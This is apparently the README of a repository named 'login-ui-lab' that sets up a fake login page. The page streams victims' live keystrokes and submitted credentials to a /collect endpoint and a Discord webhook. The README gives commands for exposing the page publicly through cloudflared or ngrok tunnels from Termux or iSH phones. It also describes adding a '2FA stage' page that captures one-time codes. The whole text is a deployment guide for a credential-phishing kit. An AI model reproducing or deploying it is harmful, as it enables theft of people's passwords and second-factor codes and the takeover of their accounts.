# Setup

## Endpoints

Edit top of `server.js` or env:

```
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
PORT=8080
```

Page posts to `/collect`. Live keystrokes and full submit both land there.

## Termux

```bash
pkg update && pkg install nodejs cloudflared git
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js &
cloudflared tunnel --url http://127.0.0.1:8080
```

## iSH (iPhone)

```bash
apk add nodejs npm git
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js &
# tunnel: install cloudflared binary or use ngrok / localhost.run from another device
```

iSH has limited background processes; keep the app open. For public links from iPhone, ngrok or a Worker is often easier than cloudflared.

## ngrok

```bash
ngrok config add-authtoken YOUR_TOKEN
ngrok http 8080
```

## View captures

```bash
curl http://127.0.0.1:8080/list
# or check Discord channel
```

## 2FA stage

After login the page can load `/2fa.html` instead of redirecting. Edit `index.html` redirect target.
